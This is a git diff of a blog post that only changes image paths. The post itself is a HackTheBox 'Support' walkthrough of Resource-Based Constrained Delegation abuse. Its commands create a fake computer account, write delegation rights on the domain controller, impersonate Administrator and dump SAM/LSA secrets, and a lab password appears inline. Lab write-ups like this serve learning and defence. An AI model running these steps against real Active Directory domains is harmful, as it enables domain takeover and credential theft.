@@ -10,7 +10,7 @@ description: "A practical walkthrough of exploiting Resource-Based Constrained D
 
 For this demo i will be using the machine Support from HackTheBox
 
-![image.png](RBCD%20Using%20NXC/image.png)
+![image.png](../assets/images/posts/rbcd/image.png)
 
 lets resolve the domain name of the target & add it to our `/etc/hosts` file by :
 
@@ -18,7 +18,7 @@ lets resolve the domain name of the target & add it to our `/etc/hosts` file by 
 ❯ sudo nxc smb 10.129.251.96 -u 'Guest' -p '' --generate-hosts-file /etc/hosts
 ```
 
-![image.png](RBCD%20Using%20NXC/image%201.png)
+![image.png](../assets/images/posts/rbcd/image1.png)
 
 ### Nmap Scan
 
@@ -28,7 +28,7 @@ lets resolve the domain name of the target & add it to our `/etc/hosts` file by 
 ❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49679,49754 -sC -sV -Pn support.htb
 ```
 
-![image.png](RBCD%20Using%20NXC/image%202.png)
+![image.png](../assets/images/posts/rbcd/image2.png)
 
 According to `rustscan` and `nmap` result, we have ports that are opened:
 
@@ -51,7 +51,7 @@ lets check the machine quota first
 ❯ nxc ldap support.htb -u support -p 'Ironside47pleasure40Watchful' -M maq
 ```
 
-![image.png](RBCD%20Using%20NXC/image%203.png)
+![image.png](../assets/images/posts/rbcd/image3.png)
 
 ok sweet , that means we can create a computer but first lets take a look at the bloodhound data, so first what i will do i gather the bloodhound data by :
 
@@ -63,13 +63,13 @@ ok sweet , that means we can create a computer but first lets take a look at the
 ❯ rusthound-ce -d support.htb -u support@support.htb -z -c
 ```
 
-![image.png](RBCD%20Using%20NXC/image%204.png)
+![image.png](../assets/images/posts/rbcd/image4.png)
 
 our current owned user is `support` we will mark it as owned & check for any outbound control edges are there or not :
 
-![image.png](RBCD%20Using%20NXC/image%205.png)
+![image.png](../assets/images/posts/rbcd/image5.png)
 
-![image.png](RBCD%20Using%20NXC/image%206.png)
+![image.png](../assets/images/posts/rbcd/image6.png)
 
 ### The attack (High Level):
 
@@ -86,7 +86,7 @@ using `impacket` :
 ❯ addcomputer.py -computer-name 'raj' -computer-pass 'hackme' -dc-ip 10.129.251.96 support.htb/support:Ironside47pleasure40Watchful
 ```
 
-![image.png](RBCD%20Using%20NXC/image%207.png)
+![image.png](../assets/images/posts/rbcd/image7.png)
 
 ### Alternate using BloodyAD to create a computer :
 
@@ -94,7 +94,7 @@ using `impacket` :
 ❯ bloodyAD --host 10.129.254.78 -u support -p 'Ironside47pleasure40Watchful' -d support.htb add computer 'raj' 'hackme'
 ```
 
-![image.png](RBCD%20Using%20NXC/image%208.png)
+![image.png](../assets/images/posts/rbcd/image8.png)
 
 > **My Created Fake Computer Account - raj$ : hackme**
 > 
@@ -107,7 +107,7 @@ using `impacket` :
 ❯ rbcd.py -delegate-from 'raj$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
 ```
 
-![image.png](RBCD%20Using%20NXC/image%209.png)
+![image.png](../assets/images/posts/rbcd/image9.png)
 
 ### Alternate - using BloodyAD to grant RBCD rights :
 
@@ -115,7 +115,7 @@ using `impacket` :
 ❯ bloodyAD --host 10.129.254.78 -u support -p 'Ironside47pleasure40Watchful' -d support.htb add rbcd 'DC$' 'raj$'
 ```
 
-![image.png](RBCD%20Using%20NXC/image%2010.png)
+![image.png](../assets/images/posts/rbcd/image10.png)
 
 ### Step 3 : Get the Silver ticket of target Impersonation user (e.g Administrator) using nxc
 
@@ -125,7 +125,7 @@ using `impacket` :
 ❯ nxc smb support.htb -u 'raj$' -p 'hackme' --delegate Administrator --sam --lsa
 ```
 
-![image.png](RBCD%20Using%20NXC/image%2011.png)
+![image.png](../assets/images/posts/rbcd/image11.png)
 
 Bling Bling , we got the silver ticket of Administrator & as well as the NT Hash of Administrator too!
 
@@ -135,8 +135,8 @@ Bling Bling , we got the silver ticket of Administrator & as well as the NT Hash
 ❯ getST.py support.htb/'raj$':'hackme' -spn cifs/dc.support.htb -impersonate Administrator
 ```
 
-![image.png](RBCD%20Using%20NXC/image%2012.png)
+![image.png](../assets/images/posts/rbcd/image12.png)
 
-![image.png](RBCD%20Using%20NXC/image%2013.png)
+![image.png](../assets/images/posts/rbcd/image13.png)
 
 Hope you enjoyed the trick!
